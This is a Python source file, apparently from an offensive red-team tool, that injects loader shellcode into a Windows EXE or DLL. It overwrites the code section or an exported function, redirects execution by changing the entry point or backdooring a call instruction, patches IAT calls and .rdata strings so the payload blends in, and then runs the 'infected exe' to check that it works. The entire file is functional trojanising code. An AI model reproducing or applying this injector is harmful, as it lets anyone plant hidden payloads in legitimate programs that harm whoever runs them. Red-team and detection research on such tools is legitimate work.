from helper import *
import logging
import time
import logging

from model.carrier import Carrier, DataReuseEntry
from pe.pehelper import *
from model.exehost import *
from observer import observer
from pe.derbackdoorer import FunctionBackdoorer
from pe.superpe import SuperPe
from model.project import Project
from model.settings import Settings

logger = logging.getLogger("Injector")


def inject_exe(
    main_shc_path: FilePath,
    settings: Settings,
    project: Project,
):
    shellcode_in = project.payload.payload_path
    exe_in = settings.inject_exe_in
    exe_out = settings.inject_exe_out
    carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style
    source_style: FunctionInvokeStyle = settings.source_style

    logger.info("--[ Injecting: {} into {} -> {}".format(
        shellcode_in, exe_in, exe_out
    ))

    # Read prepared loader shellcode
    # And check if it fits into the target code section
    main_shc = file_readall_binary(main_shc_path)
    shellcode_len = len(main_shc)
    if shellcode_len + 128 > project.exe_host.code_section.Misc_VirtualSize:
        raise Exception("Error: Shellcode {}+128 too small for target code section {}".format(
            shellcode_len, project.exe_host.code_section.Misc_VirtualSize
        ))

    # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
    superpe = SuperPe(exe_in)
    function_backdoorer = FunctionBackdoorer(superpe)

    shellcode_offset: int = 0  # file offset
    if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
        # Special case. put it at the beginning of the exported DLL function
        logger.info("--[ Overwrite DLL function {} with shellcode".format(settings.dllfunc))
        rva = superpe.getExportEntryPoint(settings.dllfunc)

        # Size and sanity checks
        function_size = superpe.get_size_of_exported_function(settings.dllfunc)
        if shellcode_len >= function_size:
            raise Exception("Shellcode too large: {} > {} exported function {}".format(
                shellcode_len, function_size, settings.dllfunc
            ))

        # Inject
        shellcode_offset = superpe.get_offset_from_rva(rva)
        logger.info(f'---[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{shellcode_offset:X} to overwrite')
        superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)

    else:  # Put it somewhere in the code section, and rewire the flow
        sect = superpe.get_code_section()
        if sect == None:
            raise Exception('Could not find code section in input PE file!')
        sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
        if sect_size < shellcode_len:
            raise Exception("Shellcode too large: {} > {}".format(
                shellcode_len, sect_size
            ))
        shellcode_offset = int((sect_size - shellcode_len) / 2)  # centered in the .text section
        shellcode_offset += sect.PointerToRawData
        shellcode_rva = superpe.pe.get_rva_from_offset(shellcode_offset)

        logger.info("--( Inject: Shellcode rva:0x{:X} (from offset:0x{:X})".format(
            shellcode_rva, shellcode_offset))

        # Copy the shellcode
        superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)

        # rewire flow
        if superpe.is_dll() and settings.dllfunc != "":
            logger.info("---( Rewire: DLL function: {} ".format(settings.dllfunc))

            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
                # Handled above, without arriving here
                raise Exception("We should not land here")

            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                addr = superpe.getExportEntryPoint(settings.dllfunc)
                logger.info("--( Inject DLL: Patch {} (0x{:X})".format(
                    settings.dllfunc, addr))
                function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)

        else: # EXE
            logger.info("---( Rewire: EXE")

            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
                logger.info("--( Inject EXE: Change Entry Point to 0x{:X}".format(
                    shellcode_rva))
                superpe.set_entrypoint(shellcode_rva)

            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                addr = superpe.get_entrypoint()
                logger.info("--( Inject EXE: Patch from entrypoint (0x{:X})".format(
                    addr))
                function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)

        if source_style == FunctionInvokeStyle.iat_reuse:
            injected_fix_iat(superpe, project.carrier, project.exe_host)
            injected_fix_data(superpe, project.carrier, project.exe_host)

    # We done
    superpe.write_pe_to_file(exe_out)

    # verify and log
    #shellcode = file_readall_binary(shellcode_in)
    #shellcode_len = len(shellcode)
    #code = extract_code_from_exe_file(exe_out)
    #in_code = code[function_backdoorer.shellcodeOffsetRel:function_backdoorer.shellcodeOffsetRel+shellcode_len]
    #jmp_code = code[function_backdoorer.backdoorOffsetRel:function_backdoorer.backdoorOffsetRel+12]
    #if config.debug:
    #    observer.add_code_file("exe_extracted_loader", in_code)
    #    observer.add_code_file("exe_extracted_jmp", jmp_code)


def injected_fix_iat(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
    """replace IAT-placeholders in shellcode with call's to the IAT"""
    code = superpe.get_code_section_data()

    for iatRequest in carrier.get_all_iat_requests():
        if not iatRequest.placeholder in code:
            raise Exception("IatResolve ID {} not found, abort".format(iatRequest.placeholder))
        destination_virtual_address = exe_host.get_vaddr_of_iatentry(iatRequest.name)
        if destination_virtual_address == None:
            raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
        
        offset_from_code = code.index(iatRequest.placeholder)
        instruction_virtual_address = offset_from_code + exe_host.image_base + exe_host.code_section.VirtualAddress
        logger.info("    Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X}".format(
            iatRequest.placeholder.hex(), instruction_virtual_address, destination_virtual_address
        ))
        jmp = assemble_relative_call(
            instruction_virtual_address, destination_virtual_address
        )
        code = code.replace(iatRequest.placeholder, jmp)

    superpe.write_code_section_data(code)


def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
    """Inject shellcode-data into .rdata and replace reusedata_fixup placeholders in code with LEA"""
    # Insert my data into the .rdata section.
    # Chose and save each datareuse_fixup's addres.
    reusedata_fixups: List[DataReuseEntry] = carrier.get_all_reusedata_fixups()
    if len(reusedata_fixups) == 0:
        # nothing todo
        return
    
    # Put stuff into .rdata section in the PE
    peSection = exe_host.superpe.get_section_by_name(".rdata")
    if peSection == None:
        raise Exception("No .rdata section found, abort")
    
    rm = exe_host.get_rdata_relocmanager()

    if True:  # FIXME this is a hack which is sometimes necessary
        sect_data_copy = peSection.pefile_section.get_data()
        string_off = find_first_utf16_string_offset(sect_data_copy)
        if string_off == None:
            raise Exception("Strings not found in .rdata section, abort")
        if string_off < 100:
            logging.warn("weird: Strings in .rdata section at offset {} < 100".format(string_off))
        rm.add_range(peSection.virt_addr, peSection.virt_addr + string_off)

    # Do all .rdata patches
    for datareuse_fixup in reusedata_fixups:
        # get a hole in the .rdata section to put our data
        hole = rm.find_hole(len(datareuse_fixup.data))
        if hole == None:
            raise Exception("No suitable hole with size {} found in .rdata section, abort".format(
                len(datareuse_fixup.data)
            ))
        fixup_offset_rdata = hole[0]  # the start address of the hole (from start of .rdata)
        rm.add_range(hole[0], hole[1])  # mark it as used
        var_data = datareuse_fixup.data
        superpe.pe.set_bytes_at_offset(fixup_offset_rdata, var_data)
        datareuse_fixup.addr = fixup_offset_rdata + peSection.virt_addr + exe_host.image_base - peSection.raw_addr
        logging.info("    Add data to .rdata at 0x{:X} (off: {}): {}".format(
            datareuse_fixup.addr, fixup_offset_rdata, var_data.decode('utf-16le')))
        fixup_offset_rdata += len(var_data) + 8

    # patch code section
    # replace the placeholder with a LEA instruction to the data we written above
    code = superpe.get_code_section_data()
    for datareuse_fixup in reusedata_fixups:
        if not datareuse_fixup.randbytes in code:
            raise Exception("DataReuse: ID {} not found, abort".format(
                datareuse_fixup.randbytes))
        
        offset_from_datasection = code.index(datareuse_fixup.randbytes)
        instruction_virtual_address = offset_from_datasection + exe_host.image_base + exe_host.code_section.VirtualAddress
        destination_virtual_address = datareuse_fixup.addr
        logger.info("    Replace {} at VA 0x{:X} with LEA {} .rdata 0x{:X}".format(
            datareuse_fixup.randbytes.hex(), instruction_virtual_address, datareuse_fixup.register, destination_virtual_address
        ))
        lea = assemble_lea(
            instruction_virtual_address, destination_virtual_address, datareuse_fixup.register
        )
        code = code.replace(datareuse_fixup.randbytes, lea)
    superpe.write_code_section_data(code)


def verify_injected_exe(exefile: FilePath, dllfunc="") -> int:
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_exe(exefile, dllfunc=dllfunc, check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(VerifyFilename)
        return 0
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1

